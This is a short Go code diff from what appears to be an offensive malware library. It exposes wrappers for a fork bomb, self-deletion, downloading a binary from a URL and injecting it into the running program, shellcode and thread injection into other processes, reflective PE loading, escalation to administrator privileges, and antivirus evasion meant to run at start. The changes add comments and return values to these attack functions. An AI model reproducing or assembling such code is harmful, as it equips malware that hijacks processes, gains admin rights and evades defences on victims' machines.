@@ -182,6 +182,7 @@ func Forkbomb() {
 	}
 }
 
+// Get Self-Filename
 func GetName() (string, error) {
 	filename, err := osext.Executable()
 	if err != nil {
@@ -204,26 +205,30 @@ func Remove() {
 	os.Remove(os.Args[0])
 }
 
+// Download binary fromm provided url and inject into self
 func BoosterShot(url string) {
 	injection.BoosterShot(url)
 }
 
-func InjectIntoProc(proc, args, data string) {
-	shellcode.InjectIntoProcess(proc, args, data)
+// Gets process, arguments and data to inject into a process
+func InjectIntoProc(proc, args, data string) bool {
+	return shellcode.InjectIntoProcess(proc, args, data)
 }
 
-func Escalate(path string) {
-	escalate.Escalate(path)
+// Escalates to Admin privileges for the provided file path (pass self to elevate running process)
+func Escalate(path string) string {
+	return escalate.Escalate(path)
 }
 
-func ReflectiveRunPE(destPE []byte) {
-	reflection.ReflectiveRunPE(destPE)
+func ReflectiveRunPE(destPE []byte) bool {
+	return reflection.ReflectiveRunPE(destPE)
 }
 
-func CreateThreadInject(data string) {
-	shellcode.CreateThreadInject(data)
+func CreateThreadInject(data string) bool {
+	return shellcode.CreateThreadInject(data)
 }
 
+// Should run on start. Starts processes for runtime AV evasion
 func Bypass() {
 	bypass.BypassAV()
 }
